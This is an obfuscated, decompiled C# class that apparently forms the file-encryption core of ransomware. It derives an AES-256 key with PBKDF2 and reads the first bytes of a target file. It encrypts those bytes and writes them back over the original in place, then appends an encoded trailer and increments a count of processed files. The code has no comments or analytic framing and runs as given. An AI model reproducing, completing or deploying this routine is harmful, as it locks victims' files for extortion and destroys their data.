using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace uBrdXrCSgnwM;

public static class zuVeojPvzZvsAuYXeg
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] rhGTroEfaFqc(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = GsfQDAhgSw(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using (Aes aes = new AesManaged())
		{
			aes.KeySize = 256;
			aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
			aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
			aes.Padding = PaddingMode.None;
			aes.Mode = CipherMode.CBC;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(byte_0, 0, byte_0.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			rfc2898DeriveBytes.Dispose();
		}
		return result;
	}

	public static Rfc2898DeriveBytes GsfQDAhgSw(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] eiVZeDjgvjzXx(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (hWHDXjXKuyuXQ.kcgyNtrPsiyuwV == getString_0(107396911))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (hWHDXjXKuyuXQ.hIFJbdEMJudY)
			{
				try
				{
					File.AppendAllText(hWHDXjXKuyuXQ.LImNkSPhwOOQHW, getString_0(107387478) + string_0 + getString_0(107410428) + ex.Message + getString_0(107395862));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
	}

	public static bool efnMlvSzfC(string CijILhJAqDGY, byte[] RJbBOzKoWoPeh, byte[] opeYgyFjaEFL = null)
	{
		try
		{
			byte[] array = null;
			if (hWHDXjXKuyuXQ.kcgyNtrPsiyuwV == getString_0(107396911))
			{
				array = (hWHDXjXKuyuXQ.MFCrMNyVwftIF ? Encoding.ASCII.GetBytes(hWHDXjXKuyuXQ.XtEtTgUvwHGMW(hWHDXjXKuyuXQ.PvAuHyHwFZ) + hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410357)) + Convert.ToString(hWHDXjXKuyuXQ.ybUSgcGwjKebC) + hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410357))) : (hWHDXjXKuyuXQ.CuCRTFRskQOdHM ? Encoding.ASCII.GetBytes(hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410402)) + hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410411)) + Convert.ToString(hWHDXjXKuyuXQ.ybUSgcGwjKebC) + hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410411))) : Encoding.ASCII.GetBytes(hWHDXjXKuyuXQ.XtEtTgUvwHGMW(hWHDXjXKuyuXQ.PvAuHyHwFZ) + hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410411)) + Convert.ToString(hWHDXjXKuyuXQ.ybUSgcGwjKebC) + hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410411)))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CijILhJAqDGY, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(RJbBOzKoWoPeh, 0, RJbBOzKoWoPeh.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(CijILhJAqDGY, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!hWHDXjXKuyuXQ.MFCrMNyVwftIF)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(opeYgyFjaEFL, 0, opeYgyFjaEFL.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (hWHDXjXKuyuXQ.MFCrMNyVwftIF ? Encoding.ASCII.GetBytes(hWHDXjXKuyuXQ.XtEtTgUvwHGMW(hWHDXjXKuyuXQ.PvAuHyHwFZ) + hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410357)) + Convert.ToString(hWHDXjXKuyuXQ.ybUSgcGwjKebC) + hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410357))) : (hWHDXjXKuyuXQ.CuCRTFRskQOdHM ? Encoding.ASCII.GetBytes(hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410402)) + hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410411)) + Convert.ToString(hWHDXjXKuyuXQ.ybUSgcGwjKebC) + hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410411))) : Encoding.ASCII.GetBytes(hWHDXjXKuyuXQ.XtEtTgUvwHGMW(hWHDXjXKuyuXQ.PvAuHyHwFZ) + hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410411)) + Convert.ToString(hWHDXjXKuyuXQ.ybUSgcGwjKebC) + hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410411)))));
				FileStream fileStream2 = new FileStream(CijILhJAqDGY, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(RJbBOzKoWoPeh, 0, RJbBOzKoWoPeh.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream = new FileStream(CijILhJAqDGY, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!hWHDXjXKuyuXQ.MFCrMNyVwftIF)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(opeYgyFjaEFL, 0, opeYgyFjaEFL.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			hWHDXjXKuyuXQ.DnHtYVwZFeaR++;
		}
		catch (Exception ex)
		{
			if (hWHDXjXKuyuXQ.hIFJbdEMJudY)
			{
				try
				{
					File.AppendAllText(hWHDXjXKuyuXQ.LImNkSPhwOOQHW, getString_0(107387478) + CijILhJAqDGY + getString_0(107410380) + ex.Message + getString_0(107395862));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array = null;
				array = (hWHDXjXKuyuXQ.MFCrMNyVwftIF ? Encoding.ASCII.GetBytes(hWHDXjXKuyuXQ.XtEtTgUvwHGMW(hWHDXjXKuyuXQ.PvAuHyHwFZ) + hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410357)) + Convert.ToString(hWHDXjXKuyuXQ.ybUSgcGwjKebC) + hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410357))) : (hWHDXjXKuyuXQ.CuCRTFRskQOdHM ? Encoding.ASCII.GetBytes(hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410402)) + hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410411)) + Convert.ToString(hWHDXjXKuyuXQ.ybUSgcGwjKebC) + hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410411))) : Encoding.ASCII.GetBytes(hWHDXjXKuyuXQ.XtEtTgUvwHGMW(hWHDXjXKuyuXQ.PvAuHyHwFZ) + hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410411)) + Convert.ToString(hWHDXjXKuyuXQ.ybUSgcGwjKebC) + hWHDXjXKuyuXQ.XtEtTgUvwHGMW(getString_0(107410411)))));
				FileStream fileStream2 = new FileStream(CijILhJAqDGY, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(RJbBOzKoWoPeh, 0, RJbBOzKoWoPeh.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using (FileStream fileStream = new FileStream(CijILhJAqDGY, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!hWHDXjXKuyuXQ.MFCrMNyVwftIF)
					{
						fileStream.Write(array, 0, array.Length);
					}
					else
					{
						fileStream.Write(opeYgyFjaEFL, 0, opeYgyFjaEFL.Length);
						fileStream.Write(array, 0, array.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static zuVeojPvzZvsAuYXeg()
	{
		Strings.CreateGetStringDelegate(typeof(zuVeojPvzZvsAuYXeg));
	}
}
